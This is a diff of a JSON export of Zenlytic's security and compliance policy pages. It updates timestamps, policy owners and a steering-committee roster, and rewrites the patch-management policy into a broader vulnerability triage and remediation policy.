@@ -1,5 +1,5 @@
 {
-  "exportedAt": "2025-12-23T17:34:57.697Z",
+  "exportedAt": "2026-08-02T03:03:25.466Z",
   "pages": [
     {
       "id": "dc73011524e54feaa2a69d78d6e5164e",
@@ -11,7 +11,7 @@
         "employee",
         "retention"
       ],
-      "lastUpdated": "2025-12-23T17:33:18.277Z"
+      "lastUpdated": "2026-08-02T03:01:53.695Z"
     },
     {
       "id": "526475ca-69d2-4b67-a4f7-ddf8d8964201",
@@ -26,7 +26,7 @@
         "employee",
         "policy"
       ],
-      "lastUpdated": "2025-12-23T17:33:18.873Z"
+      "lastUpdated": "2026-08-02T03:01:54.231Z"
     },
     {
       "id": "b1cd2254-9c1a-4b0b-945f-13e646221bf0",
@@ -47,7 +47,7 @@
         "policy",
         "firewall"
       ],
-      "lastUpdated": "2025-12-23T17:33:19.518Z"
+      "lastUpdated": "2026-08-02T03:01:54.889Z"
     },
     {
       "id": "5388c71d-8cee-4d62-8be8-972d606690fd",
@@ -59,7 +59,7 @@
         "employee",
         "policy"
       ],
-      "lastUpdated": "2025-12-23T17:33:20.127Z"
+      "lastUpdated": "2026-08-02T03:01:55.525Z"
     },
     {
       "id": "db53fd75-b172-44f9-84eb-e356d718c4ac",
@@ -83,7 +83,7 @@
         "network",
         "logging"
       ],
-      "lastUpdated": "2025-12-23T17:33:24.567Z"
+      "lastUpdated": "2026-08-02T03:01:56.273Z"
     },
     {
       "id": "53107304-c676-4dad-877f-e3dc62b7fe2f",
@@ -105,7 +105,7 @@
         "procedure",
         "vendor"
       ],
-      "lastUpdated": "2025-12-23T17:33:27.220Z"
+      "lastUpdated": "2026-08-02T03:01:57.376Z"
     },
     {
       "id": "519cf166-e30d-44bf-b454-d388ed246e04",
@@ -133,13 +133,13 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2025-12-23T17:33:28.813Z"
+      "lastUpdated": "2026-08-02T03:01:59.240Z"
     },
     {
       "id": "cdfb1ee2-0e75-4a98-b2ee-05e323f44433",
       "title": "CC2.3.3 Incident Management",
       "parent": "Employee Handbook",
-      "content": "Ex Quanta Inc (d.b.a Zenlytic)\n# Incident Management\nVersion: 0.0\nPolicy Owner: Paul Blankley\nStatus: Implemented\n# Incident Response Policy\nThe Incident Response Team shall respond to all potential or actual security or privacy incidents in accordance with the Incident Response Plan and Incident Response Playbooks.\nThe Incident Response Team shall respond to all incidents according to the Incident Response Playbooks for that category of incident. If no such playbook exists, the Incident Response Team shall follow the model response identified in the Incident Response Plan.\nThe Incident Response Lead shall ensure that all incidents are logged and archived in the Incident Response Log. Once the incident and the response are documented, the Incident Response Team shall mark the incident as closed. This will happen in Zenlytic’s Product Management Tool.\n# Incident Response Training and Testing Policy\nIn order to ensure that Zenlytic is prepared to respond to all potential and actual security and privacy incidents, the Incident Response Team shall be trained on Zenlytic's incident response policies and plan, and shall perform incident response exercises.\nThe Incident Response Team shall review the following as part of training:\n• the Incident Response Plan\n• the Incident Response Playbooks\n• the documentation logged from all incidents since the last training\n## Tabletop Exercises\nTabletop exercises are “discussion-based exercises where personnel meet in a classroom setting or in breakout groups to discuss their roles during an emergency and their responses to a particular emergency situation. A facilitator presents a scenario and asks the exercise participants questions related to the scenario, which initiates a discussion among the participants of roles, responsibilities, coordination, and decision-making. A tabletop exercise is discussion-based only and does not involve deploying equipment or other resources.”\nThe objective of a tabletop exercise is to determine if members of the Incident Response Team can realistically walk through their critical functions during a mock incident.\nTo perform a tabletop exercise, the Incident Response Team shall choose at least one incident that Zenlytic will likely face in the next twelve months.\nThe Incident Response Team shall create a playbook for the chosen incident. At a minimum, this shall include the following information for each chosen incident:\n• the date the playbook was created;\n• the individual or team responsible for the playbook (the Owner);\n• the internal and external resources needed to follow the playbook in a real incident;\n• Phase 1: How the Incident Response Team should identify occurrence of the incident; whom the Incident Response Team should notify of the incident; and how the Incident Response Team should assess the incident;\n• Phase 2: How the Incident Response Team should contain and eradicate the incident;\n• Phase 3: The post-incident activity that the Incident Response Team should take, including reporting the incident if necessary, and performing after-action reviews.\nThe Incident Response Team may revisit and update existing playbooks as part of tabletop testing.\nIn addition to scheduled tabletop exercises, at least annually, the Incident Response Lead will simulate the occurrence of an incident and ensure that the Incident Response Team follows the relevant playbooks. The test incident shall be logged in the Incident Response Log.\n# Concept of Operations for Incident Response\nZenlytic shall use a phased approach for the investigation and resolution of privacy and security incidents.\n## Incident Response Planning\nZenlytic shall plan its response to security and privacy incidents by developing this Incident Response Plan, developing the Incident Response Playbooks (as described in the Incident Response Training and Testing Policy), and applying security controls for critical information systems.\n### Business Impact Analysis\nThe Incident Response Team shall prioritize its responses to multiple incidents based on:\n• the criticality of the affected assets; and\n• the current or potential adverse effect.\n### Communications\nDuring the incident response process, the Incident Response Team shall communicate via the following methods/tools:\n• Slack\n• Video chat\n• Phone\n• Email (if necessary)\n## Incident Response Phases\n### Phase 1: Identification and Notification\nActivation Criteria\nThe identification phase is focused on detecting whether an actual security or privacy incident took place. In this phase, the responder shall attempt to gain an understanding of the nature of the incident and to make a determination whether the incident is not a false positive.\nNotification Procedures\nIf the event is not a false positive, or the responder is unable to make a determination, the responder shall notify other workforce members according to the playbook for that type of incident. If no individual is identified, the workforce member shall notify the Security Officer or the Incident Response Lead.\nAssessment\nIncidents and response efforts, shall be documented with:\n• A ticket in Linear (or other issue tracking tool).\n• (If applicable to the incident) A Postmortem (Root Cause Analysis) report\nThe Incident Response Team shall assess the scope and nature of the incident by reviewing the following:\n• Incident name\n• Incident type (e.g., availability, denial of service, unauthorized access, etc)\n• An executive summary of the incident\n• Severity level\n• Status of the incident\n• A full timeline of actions taken by all members of the Incident Response Team (this is updated through all phases of the incident)\n### Phase 2: Containment and Eradication\nThe Incident Response Team shall contain and eradicate the incident.\nPlaybooks should clearly identify the steps that should be taken to limit and mitigate the effects of the compromise.\n### Phase 3: Post-Incident Activity\nReporting\nAs applicable, the Security Officer shall report the incident to necessary parties to fulfill contractual, statutory, or other legal requirements and best practices.\nReview and Prevention\nAfter eradication and recovery of each incident, the Incident Response Team shall review the incident as well as Zenlytic’s handling of the incident. This should be fully documented in a Postmortem (Root Cause Analysis) report, along with any action items designed to mitigate or prevent such incidents in the future.",
+      "content": "Ex Quanta Inc (d.b.a Zenlytic)\n# Incident Management\nVersion: 0.0\nPolicy Owner: Anshu Aggarwal\nStatus: Implemented\n# Incident Response Policy\nThe Incident Response Team shall respond to all potential or actual security or privacy incidents in accordance with the Incident Response Plan and Incident Response Playbooks.\nThe Incident Response Team shall respond to all incidents according to the Incident Response Playbooks for that category of incident. If no such playbook exists, the Incident Response Team shall follow the model response identified in the Incident Response Plan.\nThe Incident Response Lead shall ensure that all incidents are logged and archived in the Incident Response Log. Once the incident and the response are documented, the Incident Response Team shall mark the incident as closed. This will happen in Zenlytic’s Product Management Tool.\n# Incident Response Training and Testing Policy\nIn order to ensure that Zenlytic is prepared to respond to all potential and actual security and privacy incidents, the Incident Response Team shall be trained on Zenlytic's incident response policies and plan, and shall perform incident response exercises.\nThe Incident Response Team shall review the following as part of training:\n• the Incident Response Plan\n• the Incident Response Playbooks\n• the documentation logged from all incidents since the last training\n## Tabletop Exercises\nTabletop exercises are “discussion-based exercises where personnel meet in a classroom setting or in breakout groups to discuss their roles during an emergency and their responses to a particular emergency situation. A facilitator presents a scenario and asks the exercise participants questions related to the scenario, which initiates a discussion among the participants of roles, responsibilities, coordination, and decision-making. A tabletop exercise is discussion-based only and does not involve deploying equipment or other resources.”\nThe objective of a tabletop exercise is to determine if members of the Incident Response Team can realistically walk through their critical functions during a mock incident.\nTo perform a tabletop exercise, the Incident Response Team shall choose at least one incident that Zenlytic will likely face in the next twelve months.\nThe Incident Response Team shall create a playbook for the chosen incident. At a minimum, this shall include the following information for each chosen incident:\n• the date the playbook was created;\n• the individual or team responsible for the playbook (the Owner);\n• the internal and external resources needed to follow the playbook in a real incident;\n• Phase 1: How the Incident Response Team should identify occurrence of the incident; whom the Incident Response Team should notify of the incident; and how the Incident Response Team should assess the incident;\n• Phase 2: How the Incident Response Team should contain and eradicate the incident;\n• Phase 3: The post-incident activity that the Incident Response Team should take, including reporting the incident if necessary, and performing after-action reviews.\nThe Incident Response Team may revisit and update existing playbooks as part of tabletop testing.\nIn addition to scheduled tabletop exercises, at least annually, the Incident Response Lead will simulate the occurrence of an incident and ensure that the Incident Response Team follows the relevant playbooks. The test incident shall be logged in the Incident Response Log.\n# Concept of Operations for Incident Response\nZenlytic shall use a phased approach for the investigation and resolution of privacy and security incidents.\n## Incident Response Planning\nZenlytic shall plan its response to security and privacy incidents by developing this Incident Response Plan, developing the Incident Response Playbooks (as described in the Incident Response Training and Testing Policy), and applying security controls for critical information systems.\n### Business Impact Analysis\nThe Incident Response Team shall prioritize its responses to multiple incidents based on:\n• the criticality of the affected assets; and\n• the current or potential adverse effect.\n### Communications\nDuring the incident response process, the Incident Response Team shall communicate via the following methods/tools:\n• Slack\n• Video chat\n• Phone\n• Email (if necessary)\n## Incident Response Phases\n### Phase 1: Identification and Notification\nActivation Criteria\nThe identification phase is focused on detecting whether an actual security or privacy incident took place. In this phase, the responder shall attempt to gain an understanding of the nature of the incident and to make a determination whether the incident is not a false positive.\nNotification Procedures\nIf the event is not a false positive, or the responder is unable to make a determination, the responder shall notify other workforce members according to the playbook for that type of incident. If no individual is identified, the workforce member shall notify the Security Officer or the Incident Response Lead.\nAssessment\nIncidents and response efforts, shall be documented with:\n• A ticket in Linear (or other issue tracking tool).\n• (If applicable to the incident) A Postmortem (Root Cause Analysis) report\nThe Incident Response Team shall assess the scope and nature of the incident by reviewing the following:\n• Incident name\n• Incident type (e.g., availability, denial of service, unauthorized access, etc)\n• An executive summary of the incident\n• Severity level\n• Status of the incident\n• A full timeline of actions taken by all members of the Incident Response Team (this is updated through all phases of the incident)\n### Phase 2: Containment and Eradication\nThe Incident Response Team shall contain and eradicate the incident.\nPlaybooks should clearly identify the steps that should be taken to limit and mitigate the effects of the compromise.\n### Phase 3: Post-Incident Activity\nReporting\nAs applicable, the Security Officer shall report the incident to necessary parties to fulfill contractual, statutory, or other legal requirements and best practices.\nReview and Prevention\nAfter eradication and recovery of each incident, the Incident Response Team shall review the incident as well as Zenlytic’s handling of the incident. This should be fully documented in a Postmortem (Root Cause Analysis) report, along with any action items designed to mitigate or prevent such incidents in the future.",
       "keywords": [
         "CC2.3.3",
         "training",
@@ -149,31 +149,35 @@
         "policy",
         "procedure"
       ],
-      "lastUpdated": "2025-12-23T17:33:30.946Z"
+      "lastUpdated": "2026-08-02T03:02:00.795Z"
     },
     {
       "id": "1b4a8dad-05ac-803b-a447-fc9262f97f83",
       "title": "CC2.3.4 Software Patch Management",
       "parent": "Employee Handbook",
-      "content": "Ex Quanta Inc (d.b.a Zenlytic)\n# Software Patch Management\nVersion: 0.0\nPolicy Owner: Paul Blankley\nStatus: Implemented\n# Software Patch Management Policy\nZenlytic shall ensure that software used within the organization is consistently updated to address security vulnerabilities, improve functionality, and maintain system integrity. Zenlytic utilizes GitHub and Dependabot to automatically propose, review, and integrate software updates in a timely and secure manner.\n## Patch Identification\nDependabot shall continuously monitor all software repositories hosted on GitHub to identify available software patches, updates, and security advisories relevant to Zenlytic’s software assets.\n## Patch Evaluation and Prioritization\nUpon identification of a proposed patch, Dependabot shall automatically create a pull request (PR) for evaluation. The Software Engineering Team shall assess each PR to determine:\n• The criticality of the identified vulnerability or update\n• Potential impact of the update on system stability\n• Any necessary testing prior to deployment\nPatches addressing high-severity vulnerabilities or critical updates shall be prioritized.\n## Patch Integration and Deployment\nApproved patches shall be integrated promptly after successful testing and validation. Integration occurs through Zenlytic’s established code review and continuous integration (CI/CD) processes, ensuring automated tests and manual code reviews confirm patch integrity prior to deployment.\nAll deployments resulting from approved Dependabot PRs shall follow the standard software release process, ensuring minimal disruption to business operations.\n## Documentation and Tracking\nZenlytic shall document all patch-related activities within GitHub, capturing:\n• Dependabot-generated PRs\n• Reviews and approvals by the Software Engineering Team\n• Successful integrations and deployments\nThis documentation supports transparency and auditability in patch management activities.\n## Review and Compliance\nThe Software Engineering Lead or designated representative shall periodically review patch management activities to ensure compliance with this policy. The frequency of these reviews shall be at least quarterly.\nAny deviations from the prescribed processes shall be documented, along with corresponding corrective actions.\n## Training\nThe Software Engineering Team shall receive training on Zenlytic’s patch management policy and practices, including:\n• Dependabot functionality and usage\n• GitHub integration workflows\n• Review and deployment procedures\nRegular refresher training shall be conducted on an as needed basis on significant process changes.",
+      "content": "Ex Quanta Inc (d.b.a Zenlytic)\n# Vulnerability & Patch Management\nVersion: 1.0\nPolicy Owner: Paul Blankley\nStatus: Implemented\n## Purpose & Scope\nZenlytic identifies, evaluates, and remediates security vulnerabilities across its software, infrastructure, and cloud environment in a timely, risk-prioritized manner. This policy covers vulnerabilities from all sources Zenlytic currently monitors, automated software composition / dependency scanning, periodic penetration testing, and responsibly disclosed external reports and applies to all production systems, code repositories, and supporting infrastructure operated by Zenlytic. Software patching of dependencies is one remediation method within this broader process.\n## Identification\nZenlytic identifies vulnerabilities through:\n• Dependency scanning — GitHub and Dependabot continuously monitor repositories for vulnerable dependencies and available security updates, automatically opening pull requests where a fix is available.\n• Penetration testing — periodic third-party assessments (see Vulnerability Testing records).\n• External reports — vulnerabilities reported by customers, researchers, or vendors.\n## Triage & Severity Classification\nAll newly identified vulnerabilities are triaged within 5 business days of detection. Triage assigns an effective severity and a disposition (remediate or risk-accept).\nEffective severity is based on the CVSS v3.x base score, adjusted for real-world exploitability and exposure:\n• Adjusted upward where a known exploit exists in the wild (e.g., inclusion in CISA's Known Exploited Vulnerabilities catalog) or the affected component is internet-facing or handles customer data.\n• Adjusted downward where the vulnerable code is not reachable in Zenlytic's running production environment — for example, build-time or development-only dependencies that do not ship to production runtime. Such findings may be reclassified to a lower effective severity or routed to risk-acceptance.\nThe remediation clock begins upon completion of triage and confirmation that a finding is applicable, not at the moment of automated detection. Findings awaiting triage are measured against the triage window above. Findings determined during triage to be non-applicable or unreachable are dispositioned through the exception / risk-acceptance process and do not accrue against the remediation target.\nWhere exposure differs within a tier, the tighter end of the range applies to backend / runtime / internet-facing components, and the looser end to build-time or development-only components. Medium and Low findings are remediated on a best-effort basis and may be batched into regular maintenance cycles.\n## Remediation\nA vulnerability is considered remediated when risk has been measurably reduced or eliminated through any of:\n• Applying a patch or upgrading the affected dependency\n• Correcting Zenlytic's own application code\n• Reconfiguration or hardening (e.g., reducing exposure, correcting permissions)\n• A compensating control that reduces risk to an acceptable level\n• Decommissioning or disabling the affected component\n• A formally approved risk acceptance (see Exceptions)\nDependency patches are integrated through Zenlytic's standard code review and CI/CD process, with automated tests and manual review confirming integrity prior to deployment. Critical and High findings are prioritized.\n## Exceptions & Risk Acceptance\nWhere a vulnerability cannot be remediated within its target timeframe due to business or technical constraints, or is determined to be non-applicable, a written exception may be recorded documenting the rationale, any compensating controls, and a target remediation date where applicable. Exceptions are approved in accordance with the risk-acceptance process in the Risk Management Process Policy (CC9.1.1) and tracked to closure.\n## Backlog Remediation\nVulnerabilities identified prior to the effective date of this policy are addressed through a documented backlog-remediation effort: each open finding is triaged and assigned an effective severity, disposition, and target remediation date. Progress is reviewed in the periodic review below. The target timeframes in this policy apply to the triaged disposition date for pre-existing findings.\n## Documentation & Tracking\nVulnerabilities and their remediation are tracked through GitHub and Zenlytic's issue tracking, capturing effective severity, detection date, triage date, disposition, remediation action, and closure date. This record supports measurement against the target timeframes and audit evidence.\n## Review & Compliance\nThe Software Engineering Lead, or a designated representative, reviews vulnerability management activity, backlog burn-down, and adherence to the target timeframes at least quarterly. Deviations are documented with corresponding corrective actions.\n## Training\nEngineering personnel receive training on this policy and supporting practices, including dependency-update workflows, triage and severity classification, remediation procedures, and the exception process. Refresher training is conducted as needed when processes change materially.",
       "keywords": [
         "CC2.3.4",
+        "CC9.1.1",
         "training",
         "security",
         "compliance",
         "audit",
+        "rpo",
+        "penetration test",
         "vulnerability",
         "policy",
         "procedure",
-        "integration"
+        "infrastructure",
+        "vendor"
       ],
-      "lastUpdated": "2025-12-23T17:33:31.614Z"
+      "lastUpdated": "2026-08-02T03:02:02.955Z"
     },
     {
       "id": "b2654df8-028d-4902-a8cf-93319708fc73",
       "title": "CC1.2.4 Roles & Responsibilities",
       "parent": "Employee Handbook",
-      "content": "Ex Quanta Inc (d.b.a Zenlytic)\n# Roles & Responsibilities\nVersion: 0.0\nSection Owner: Paul Blankley\nStatus: Implemented\n# General Workforce\nThe general workforce is responsible for day-to-day activity within the organization, and may have responsibilities as required by the ISMS.\n## Competencies\nAll employees should have the skills and knowledge required to review and abide by the policies in the ISMS.\n# Privacy Team\nThe Privacy Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Anshu Aggarwal anshu@zenlytic.com\n## Responsibilities\n• Overseeing and responding to data-privacy complaints and questions\n• Tracking and managing Zenlytic's use and disclosure of data\n• Understanding the organization’s privacy obligations\n## Competencies\nMembers of the Privacy Team should have the skills and knowledge required to:\n• Understand Zenlytic's use and disclosure of data\n• Work with other business owners to document Zenlytic's data use\n• Understand the organization’s privacy risks\n# Human Resources Team\nThe Human Resources Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Ryan Janssen ryan@zenlytic.com\n## Description\nThe Human Resources Team is responsible for performing human resources functions related to the ISMS, including:\n• Maintaining onboarding and offboarding procedures for employees\n• Performing background screening for prospective hires\n• Overseeing the disciplinary action process for employees involved in security and privacy incidents\n# Incident Response Team\nThe Incident Response Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Joe Van Gundy joe@zenlytic.com\n## Responsibilities\nThe Incident Response Team is responsible for:\n• Investigating and resolving suspected or actual security or privacy incidents\n## Competencies\nMembers of the Incident Response Team should have the skills and knowledge required to:\n• Investigate potential and actual security and privacy issues\n## Membership\nAt minimum, the Incident Response Team shall include:\n• The Security Officer (e.g., CISO, CTO, or equivalent)\n• A technical lead (e.g., CTO, CIO, or equivalent)\n# Privacy Officer\nThe Privacy Officer role is assigned to:\n• Paul Blankley paul@zenlytic.com\n## Responsibilities\n• managing the Privacy Team's operations; and\n• acting as the default point of contact for all privacy questions and concerns.\n## Competencies\nThe Privacy Officer should have the skills and knowledge required to:\n• Be a member of the Privacy Team\n• Manage the organization’s privacy operations\n# Security Team\nThe Security Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Joe Van Gundy joe@zenlytic.com\n## Description\nThe Security Team shall support and perform duties as the Security Officer delegates. The Security Team is responsible for the day-to-day maintenance and application of ISMS controls, including:\n• Implementing and testing security patches\n• Defining audit criteria and scope; conducting security audits\n• Retaining ISMS documented information as evidence of the audit program and results\n• Monitoring security alerts, news, and announcements for relevant technology used in the ISMS\n• Reviewing access permissions, audit logs, credential rotation, and device management\n• Coordinating vulnerability scanning and penetration testing\n• Reporting audit results to the Management Team\n• Planning, establishing, implementing, and maintaining the audit program, including frequency, methods, responsibilities, planning requirements, and reporting\n# Security Steering Committee\nThe Security Steering Committee comprises:\n• Paul Blankley paul@zenlytic.com\n• Joe Van Gundy joe@zenlytic.com\n• Anshu Aggarwal anshu@zenlytic.com\n## Description\nCC1.1.5 Security Steering Committee Charter \n## Responsibilities\nThe Engineering Team is responsible for:\n• Developing software, including in-scope ISMS assets\n• Adhering to secure system development policies\n## Competencies\nMembers of the Engineering Team should have the skills and knowledge required to:\n• Follow Zenlytic's system development lifecycle, including requirements related to change management\n# Service Reliability Lead\nThe Service Reliability Lead role is assigned to:\n• Paul Blankley paul@zenlytic.com\n## Responsibilities\nThe Service Reliability Lead is responsible for:\n• Leading the Service Reliability Team\n• Single point of contact is required for business-continuity purposes\n## Competencies\nThe Service Reliability Lead should have the skills and knowledge required to:\n• Be a member of the Service Reliability Team\n• Lead the Service Reliability Team in the event of a disruption in uptime\n# Incident Response Lead\nThe Incident Response Lead role is assigned to:\n• Paul Blankley paul@zenlytic.com\n## Responsibilities\nThe Incident Response Lead is responsible for:\n• Leading the Incident Response Team\n• Single point of contact is required for incident-response purposes\n## Competencies\nThe Incident Response Lead should have the skills and knowledge required to:\n• Be a member of the Incident Response Team\n• Lead the Incident Response Team in the event of a security or privacy incident\n# Service Reliability Team\nThe Service Reliability Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Joe Van Gundy joe@zenlytic.com\n## Responsibilities\nThe Service Reliability Team is responsible for:\n• Day-to-day availability operations of Zenlytic's information systems, including in-scope ISMS assets\n• Responding to disruptions in asset uptime\n• Preparing for and responding to business continuity incidents, including:\n## Competencies\nThe Service Reliability Team should have the skills and knowledge required to:\n• Understand and maintain Zenlytic's assets\n• Respond to disruptions in asset uptime\n# Management Team\nThe Management Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Ryan Janssen ryan@zenlytic.com\n## Responsibilities\nThe Management Team is responsible for:\n• Acting as the organization’s primary governance body\n• Establishing, implementing, maintaining, and continually improving the ISMS\n## Competencies\nMembers of the Management Team should have the skills and knowledge required to:\n• Build a strong security and privacy culture\n• Understand the ISMS, including how it affects business operations\n• Understand Zenlytic's risk posture and the controls or countermeasures needed to promote strong security and privacy\n# Security Officer\nThe Security Officer role is assigned to:\n• Paul Blankley paul@zenlytic.com\nThe Security Officer is responsible for:\n• Overseeing the implementation of the ISMS\n• Recommending ISMS changes to the Management Team\n• Communicating the ISMS policy to all relevant parties\n• Defining ISMS objectives and plans for the current year\n• Ensuring that security controls are documented\n• Monitoring Zenlytic's achievement against ISMS objectives\n• Establishing and continuously maintaining security projects\n• Reporting ISMS activities to the Management Team on a regular basis\n## Competencies\nThe Security Officer should have the skills and knowledge required to:\n• Be a member of the Security Team\n• Understand the entire ISMS, including Zenlytic's technical, operational, and regulatory requirements\n• Manage and execute a security-management program\n• Drive consensus around security decisions\n• Understand Zenlytic well enough to use security to support Zenlytic's business goals and objectives\n# Legal Team\nThe Legal Team role is assigned to:\n• Ryan Janssen ryan@zenlytic.com\n## Description\nThe Legal Team is responsible for performing legal and human resources functions related to ISMS performance, including but not limited to:\n• Drafting and reviewing employment contracts\n• Vendor contract review\n• Maintaining legal and privacy policies, subject to approval of the Management Team\n• Advising internal ISMS governance audits and scoping",
+      "content": "Ex Quanta Inc (d.b.a Zenlytic)\n# Roles & Responsibilities\nVersion: 0.0\nSection Owner: Paul Blankley\nStatus: Implemented\n# General Workforce\nThe general workforce is responsible for day-to-day activity within the organization, and may have responsibilities as required by the ISMS.\n## Competencies\nAll employees should have the skills and knowledge required to review and abide by the policies in the ISMS.\n# Privacy Team\nThe Privacy Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Anshu Aggarwal anshu@zenlytic.com\n## Responsibilities\n• Overseeing and responding to data-privacy complaints and questions\n• Tracking and managing Zenlytic's use and disclosure of data\n• Understanding the organization’s privacy obligations\n## Competencies\nMembers of the Privacy Team should have the skills and knowledge required to:\n• Understand Zenlytic's use and disclosure of data\n• Work with other business owners to document Zenlytic's data use\n• Understand the organization’s privacy risks\n# Human Resources Team\nThe Human Resources Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Ryan Janssen ryan@zenlytic.com\n## Description\nThe Human Resources Team is responsible for performing human resources functions related to the ISMS, including:\n• Maintaining onboarding and offboarding procedures for employees\n• Performing background screening for prospective hires\n• Overseeing the disciplinary action process for employees involved in security and privacy incidents\n# Incident Response Team\nThe Incident Response Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Joe Van Gundy joe@zenlytic.com\n## Responsibilities\nThe Incident Response Team is responsible for:\n• Investigating and resolving suspected or actual security or privacy incidents\n## Competencies\nMembers of the Incident Response Team should have the skills and knowledge required to:\n• Investigate potential and actual security and privacy issues\n## Membership\nAt minimum, the Incident Response Team shall include:\n• The Security Officer (e.g., CISO, CTO, or equivalent)\n• A technical lead (e.g., CTO, CIO, or equivalent)\n# Privacy Officer\nThe Privacy Officer role is assigned to:\n• Paul Blankley paul@zenlytic.com\n## Responsibilities\n• managing the Privacy Team's operations; and\n• acting as the default point of contact for all privacy questions and concerns.\n## Competencies\nThe Privacy Officer should have the skills and knowledge required to:\n• Be a member of the Privacy Team\n• Manage the organization’s privacy operations\n# Security Team\nThe Security Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Joe Van Gundy joe@zenlytic.com\n## Description\nThe Security Team shall support and perform duties as the Security Officer delegates. The Security Team is responsible for the day-to-day maintenance and application of ISMS controls, including:\n• Implementing and testing security patches\n• Defining audit criteria and scope; conducting security audits\n• Retaining ISMS documented information as evidence of the audit program and results\n• Monitoring security alerts, news, and announcements for relevant technology used in the ISMS\n• Reviewing access permissions, audit logs, credential rotation, and device management\n• Coordinating vulnerability scanning and penetration testing\n• Reporting audit results to the Management Team\n• Planning, establishing, implementing, and maintaining the audit program, including frequency, methods, responsibilities, planning requirements, and reporting\n# Security Steering Committee\nThe Security Steering Committee comprises:\n• Paul Blankley paul@zenlytic.com\n• Joe Van Gundy joe@zenlytic.com\n• John Schroeder john@zenlytic.com\n## Description\nCC1.1.5 Security Steering Committee Charter \n## Responsibilities\nThe Engineering Team is responsible for:\n• Developing software, including in-scope ISMS assets\n• Adhering to secure system development policies\n## Competencies\nMembers of the Engineering Team should have the skills and knowledge required to:\n• Follow Zenlytic's system development lifecycle, including requirements related to change management\n# Service Reliability Lead\nThe Service Reliability Lead role is assigned to:\n• Paul Blankley paul@zenlytic.com\n## Responsibilities\nThe Service Reliability Lead is responsible for:\n• Leading the Service Reliability Team\n• Single point of contact is required for business-continuity purposes\n## Competencies\nThe Service Reliability Lead should have the skills and knowledge required to:\n• Be a member of the Service Reliability Team\n• Lead the Service Reliability Team in the event of a disruption in uptime\n# Incident Response Lead\nThe Incident Response Lead role is assigned to:\n• Paul Blankley paul@zenlytic.com\n## Responsibilities\nThe Incident Response Lead is responsible for:\n• Leading the Incident Response Team\n• Single point of contact is required for incident-response purposes\n## Competencies\nThe Incident Response Lead should have the skills and knowledge required to:\n• Be a member of the Incident Response Team\n• Lead the Incident Response Team in the event of a security or privacy incident\n# Service Reliability Team\nThe Service Reliability Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Joe Van Gundy joe@zenlytic.com\n## Responsibilities\nThe Service Reliability Team is responsible for:\n• Day-to-day availability operations of Zenlytic's information systems, including in-scope ISMS assets\n• Responding to disruptions in asset uptime\n• Preparing for and responding to business continuity incidents, including:\n## Competencies\nThe Service Reliability Team should have the skills and knowledge required to:\n• Understand and maintain Zenlytic's assets\n• Respond to disruptions in asset uptime\n# Management Team\nThe Management Team role is assigned to:\n• Paul Blankley paul@zenlytic.com\n• Ryan Janssen ryan@zenlytic.com\n## Responsibilities\nThe Management Team is responsible for:\n• Acting as the organization’s primary governance body\n• Establishing, implementing, maintaining, and continually improving the ISMS\n## Competencies\nMembers of the Management Team should have the skills and knowledge required to:\n• Build a strong security and privacy culture\n• Understand the ISMS, including how it affects business operations\n• Understand Zenlytic's risk posture and the controls or countermeasures needed to promote strong security and privacy\n# Security Officer\nThe Security Officer role is assigned to:\n• Paul Blankley paul@zenlytic.com\nThe Security Officer is responsible for:\n• Overseeing the implementation of the ISMS\n• Recommending ISMS changes to the Management Team\n• Communicating the ISMS policy to all relevant parties\n• Defining ISMS objectives and plans for the current year\n• Ensuring that security controls are documented\n• Monitoring Zenlytic's achievement against ISMS objectives\n• Establishing and continuously maintaining security projects\n• Reporting ISMS activities to the Management Team on a regular basis\n## Competencies\nThe Security Officer should have the skills and knowledge required to:\n• Be a member of the Security Team\n• Understand the entire ISMS, including Zenlytic's technical, operational, and regulatory requirements\n• Manage and execute a security-management program\n• Drive consensus around security decisions\n• Understand Zenlytic well enough to use security to support Zenlytic's business goals and objectives\n# Legal Team\nThe Legal Team role is assigned to:\n• Ryan Janssen ryan@zenlytic.com\n## Description\nThe Legal Team is responsible for performing legal and human resources functions related to ISMS performance, including but not limited to:\n• Drafting and reviewing employment contracts\n• Vendor contract review\n• Maintaining legal and privacy policies, subject to approval of the Management Team\n• Advising internal ISMS governance audits and scoping",
       "keywords": [
         "CC1.2.4",
         "CC1.1.5",
@@ -192,7 +196,7 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2025-12-23T17:33:33.288Z"
+      "lastUpdated": "2026-08-02T03:02:04.573Z"
     },
     {
       "id": "808186e5-ec08-45e9-9539-c798f47ffb15",
@@ -210,7 +214,7 @@
         "procedure",
         "logging"
       ],
-      "lastUpdated": "2025-12-23T17:33:34.959Z"
+      "lastUpdated": "2026-08-02T03:02:05.800Z"
     },
     {
       "id": "2527d98e-ee9c-484a-b665-af3fd881eb66",
@@ -220,7 +224,7 @@
       "keywords": [
         "CC3.3.1"
       ],
-      "lastUpdated": "2025-12-23T17:33:35.576Z"
+      "lastUpdated": "2026-08-02T03:02:06.477Z"
     },
     {
       "id": "2f94af3c-24d2-4fdb-aa54-c6b3515294c1",
@@ -235,7 +239,7 @@
         "background check",
         "procedure"
       ],
-      "lastUpdated": "2025-12-23T17:33:35.888Z"
+      "lastUpdated": "2026-08-02T03:02:07.104Z"
     },
     {
       "id": "612e9f45-4c2c-4b02-b60c-d411f4623e30",
@@ -250,7 +254,7 @@
         "background check",
         "procedure"
       ],
-      "lastUpdated": "2025-12-23T17:33:36.629Z"
+      "lastUpdated": "2026-08-02T03:02:08.055Z"
     },
     {
       "id": "2b2a8dad-05ac-8047-a985-f4f279ca38fa",
@@ -267,7 +271,7 @@
         "procedure",
         "infrastructure"
       ],
-      "lastUpdated": "2025-12-23T17:33:37.974Z"
+      "lastUpdated": "2026-08-02T03:02:08.947Z"
     },
     {
       "id": "fc9d81e4-3f84-40c8-b798-d5018a890134",
@@ -280,7 +284,7 @@
         "policy",
         "procedure"
       ],
-      "lastUpdated": "2025-12-23T17:33:39.810Z"
